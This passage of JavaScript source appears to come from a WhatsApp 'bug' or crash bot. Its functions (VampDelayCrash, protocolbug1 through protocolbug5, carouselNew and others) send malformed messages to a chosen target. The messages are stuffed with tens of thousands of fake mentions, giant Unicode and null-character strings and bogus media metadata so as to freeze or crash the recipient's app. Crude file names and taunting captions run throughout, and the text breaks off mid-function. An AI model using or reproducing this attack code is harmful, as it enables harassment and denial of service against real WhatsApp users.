              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Flixce Strom 🐍 🐍 Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await PalRyz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampDelayCrash(langgxyz, target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Flixce Strom 🐍 🐍 Bug" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await PalRyz.relayMessage(target, message, { participant: { jid: target } });
}

async function VampBroadcast(langgxyz, target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Flixce Strom 🐍 🐍 Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await PalRyz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Flixce Strom 🐍 🐍 Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


        // Func Protocol 
async function protocolbug1(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Ciee Kena Bug ya??",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( Script Flixce Strom V2 )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await PalRyz.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await PalRyz.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 *Athena* - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await PalRyz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await PalRyz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
  }
    
    async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  Flixce - Is Heree🐍\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await PalRyz.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ SAHRIL VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

  async function protocolbug5v2(isTarget, mention) {
    const maxMention = 65000; // mendekati batas JS maksimal
    const mentionedList = Array.from({ length: maxMention }, (_, i) =>
        `1${Math.floor(100000 + Math.random() * 900000)}@s.whatsapp.net`
    );

    const longUnicode = "៛" + "‌‎‏" + " ".repeat(500) + "៛".repeat(20000);

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".CikssXyz || Beginner" + longUnicode,
        title: "FlixceStrom🐉〽️" + longUnicode,
        artworkDirectPath: "/v/t62.76458-24/...",
        artworkSha256: "fakehash==",
        artworkEncSha256: "fakehashenc==",
        artistAttribution: "https://instagram.com/_u/tamainfinity_",
        countryBlocklist: false,
        isExplicit: true,
        artworkMediaKey: "fakekey=="
    };

    const annotations = Array.from({ length: 5 }, () => ({
        embeddedContent: { embeddedMusic },
        embeddedAction: true
    }));

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/...",
        mimetype: "video/mp4",
        fileSha256: "fakebase64==",
        fileLength: "999999",
        seconds: 30,
        mediaKey: "fakeMediaKey==",
        caption: "𐌕𐌀𐌌𐌀 RTL\u202eBUG\u202c𐍂𐍉𐍂" + longUnicode,
        height: 720,
        width: 1280,
        fileEncSha256: "fakeenc==",
        directPath: "/v/t62.7161-24/...",
        mediaKeyTimestamp: `${Date.now()}`,
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "fakeSidecar==",
        thumbnailDirectPath: "/v/t62.36147-24/...",
        thumbnailSha256: "fakehash==",
        thumbnailEncSha256: "fakeenc==",
        annotations
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await PalRyz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
        
async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));
    
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Flixce Strom 🐍〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "CikssXyz? Come Heree!!!🐍〽"
                        }
                    },
                    description: "CikssXyx?? yess, sirrr!!!🐍〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}


// Func Neww!!
async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga Come Heree!!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "CikssXyz?✦ Im Begginner",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await PalRyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await PalRyz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}


async function carouselNew(isTarget) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "CikssXyz" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
